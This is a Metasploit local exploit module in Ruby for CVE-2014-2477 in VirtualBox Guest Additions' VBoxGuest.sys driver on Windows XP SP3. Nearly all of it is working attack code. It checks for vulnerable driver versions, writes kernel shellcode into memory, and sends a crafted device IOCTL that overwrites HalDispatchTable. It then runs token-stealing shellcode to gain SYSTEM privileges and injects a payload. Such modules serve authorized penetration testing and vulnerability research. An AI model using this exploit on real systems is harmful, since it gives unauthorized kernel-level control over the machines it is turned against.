##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require \'msf/core\'
require \'msf/core/exploit/local/windows_kernel\'
require \'rex\'

class Metasploit3 < Msf::Exploit::Local
  Rank = AverageRanking

  include Msf::Exploit::Local::WindowsKernel
  include Msf::Post::File
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process

  def initialize(info={})
    super(update_info(info, {
      \'Name\'          => \'VirtualBox Guest Additions VBoxGuest.sys Privilege Escalation\',
      \'Description\'    => %q{
        A vulnerability within the VBoxGuest driver allows an attacker to inject memory they
        control into an arbitrary location they define. This can be used by an attacker to
        overwrite HalDispatchTable+0x4 and execute arbitrary code by subsequently calling
        NtQueryIntervalProfile on Windows XP SP3 systems. This has been tested with VBoxGuest
        Additions up to 4.3.10r93012.
      },
      \'License\'       => MSF_LICENSE,
      \'Author\'        =>
        [
          \'Matt Bergin <level[at]korelogic.com>\', # Vulnerability discovery and PoC
          \'Jay Smith <jsmith[at]korelogic.com>\' # MSF module
        ],
      \'Arch\'          => ARCH_X86,
      \'Platform\'      => \'win\',
      \'SessionTypes\'  => [ \'meterpreter\' ],
      \'DefaultOptions\' =>
        {
          \'EXITFUNC\' => \'thread\',
        },
      \'Targets\'       =>
        [
          [\'Windows XP SP3\',
            {
              \'HaliQuerySystemInfo\' => 0x16bba,
              \'_KPROCESS\'  => \"\\x44\",
              \'_TOKEN\'     => \"\\xc8\",
              \'_UPID\'      => \"\\x84\",
              \'_APLINKS\'   => \"\\x88\"
            }
          ]
        ],
      \'References\'    =>
        [
          [\'CVE\', \'2014-2477\'],
          [\'URL\', \'https://www.korelogic.com/Resources/Advisories/KL-001-2014-001.txt\']
        ],
      \'DisclosureDate\'=> \'Jul 15 2014\',
      \'DefaultTarget\' => 0
    }))

  end

  def fill_memory(proc, address, length, content)

    session.railgun.ntdll.NtAllocateVirtualMemory(-1, [ address ].pack(\"L\"), nil, [ length ].pack(\"L\"), \"MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN\", \"PAGE_EXECUTE_READWRITE\")

    if not proc.memory.writable?(address)
      vprint_error(\"Failed to allocate memory\")
      return nil
    else
      vprint_good(\"#{address} is now writable\")
    end

    result = proc.memory.write(address, content)

    if result.nil?
      vprint_error(\"Failed to write contents to memory\")
      return nil
    else
      vprint_good(\"Contents successfully written to 0x#{address.to_s(16)}\")
    end

    return address
  end

  def check
    if sysinfo[\"Architecture\"] =~ /wow64/i or sysinfo[\"Architecture\"] =~ /x64/
      return Exploit::CheckCode::Safe
    end

    handle = open_device(\'\\\\\\\\.\\\\vboxguest\', \'FILE_SHARE_WRITE|FILE_SHARE_READ\', 0, \'OPEN_EXISTING\')
    if handle.nil?
      return Exploit::CheckCode::Safe
    end
    session.railgun.kernel32.CloseHandle(handle)

    os = sysinfo[\"OS\"]
    unless (os =~ /windows xp.*service pack 3/i)
      return Exploit::CheckCode::Safe
    end

    file_path = expand_path(\"%windir%\") << \"\\\\system32\\\\drivers\\\\vboxguest.sys\"
    unless file?(file_path)
      return Exploit::CheckCode::Unknown
    end

    major, minor, build, revision, branch = file_version(file_path)
    vprint_status(\"vboxguest.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}\")

    unless (major == 4)
      return Exploit::CheckCode::Safe
    end

    case minor
    when 0
      return Exploit::CheckCode::Vulnerable if build < 26
    when 1
      return Exploit::CheckCode::Vulnerable if build < 34
    when 2
      return Exploit::CheckCode::Vulnerable if build < 26
    when 3
      return Exploit::CheckCode::Vulnerable if build < 12
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    if is_system?
      fail_with(Exploit::Failure::None, \'Session is already elevated\')
    end

    if sysinfo[\"Architecture\"] =~ /wow64/i
      fail_with(Failure::NoTarget, \"Running against WOW64 is not supported\")
    elsif sysinfo[\"Architecture\"] =~ /x64/
      fail_with(Failure::NoTarget, \"Running against 64-bit systems is not supported\")
    end

    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Exploit::Failure::NotVulnerable, \"Exploit not available on this system\")
    end

    handle = open_device(\'\\\\\\\\.\\\\vboxguest\', \'FILE_SHARE_WRITE|FILE_SHARE_READ\', 0, \'OPEN_EXISTING\')
    if handle.nil?
      fail_with(Failure::NoTarget, \"Unable to open \\\\\\\\.\\\\vboxguest device\")
    end

    print_status(\"Disclosing the HalDispatchTable address...\")
    hal_dispatch_table = find_haldispatchtable
    if hal_dispatch_table.nil?
      session.railgun.kernel32.CloseHandle(handle)
      fail_with(Failure::Unknown, \"Filed to disclose HalDispatchTable\")
    else
      print_good(\"Address successfully disclosed.\")
    end

    print_status(\'Getting the hal.dll base address...\')
    hal_info = find_sys_base(\'hal.dll\')
    fail_with(Failure::Unknown, \'Failed to disclose hal.dll base address\') if hal_info.nil?

    hal_base = hal_info[0]
    print_good(\"hal.dll base address disclosed at 0x#{hal_base.to_s(16).rjust(8, \'0\')}\")
    hali_query_system_information = hal_base + target[\'HaliQuerySystemInfo\']

    print_status(\"Storing the shellcode in memory...\")
    this_proc = session.sys.process.open

    restore_ptrs =  \"\\x31\\xc0\"                                         # xor eax, eax
    restore_ptrs << \"\\xb8\" + [hali_query_system_information].pack(\'V\') # mov eax, offset hal!HaliQuerySystemInformation
    restore_ptrs << \"\\xa3\" + [hal_dispatch_table + 4].pack(\'V\')        # mov dword ptr [nt!HalDispatchTable+0x4], eax

    kernel_shell = token_stealing_shellcode(target)
    kernel_shell_address = 0x1

    buf = \"\\x90\" * 0x6000
    buf[0, 56] = \"\\x50\\x00\\x00\\x00\" * 14
    buf[0x5000, kernel_shell.length] = restore_ptrs + kernel_shell

    result = fill_memory(this_proc, kernel_shell_address, buf.length, buf)
    if result.nil?
      session.railgun.kernel32.CloseHandle(handle)
      fail_with(Failure::Unknown, \"Error while storing the kernel stager shellcode on memory\")
    else
      print_good(\"Kernel stager successfully stored at 0x#{kernel_shell_address.to_s(16)}\")
    end

    print_status(\"Triggering the vulnerability, corrupting the HalDispatchTable...\")
    session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x22a040, 0x1, 140, hal_dispatch_table + 0x4 - 40, 0)
    session.railgun.kernel32.CloseHandle(handle)

    print_status(\"Executing the Kernel Stager throw NtQueryIntervalProfile()...\")
    session.railgun.ntdll.NtQueryIntervalProfile(2, 4)

    print_status(\"Checking privileges after exploitation...\")

    unless is_system?
      fail_with(Failure::Unknown, \"The exploitation wasn\'t successful\")
    else
      print_good(\"Exploitation successful!\")
    end

    p = payload.encoded
    print_status(\"Injecting #{p.length.to_s} bytes to memory and executing it...\")
    if execute_shellcode(p)
      print_good(\"Enjoy\")
    else
      fail_with(Failure::Unknown, \"Error while executing the payload\")
    end

  end

end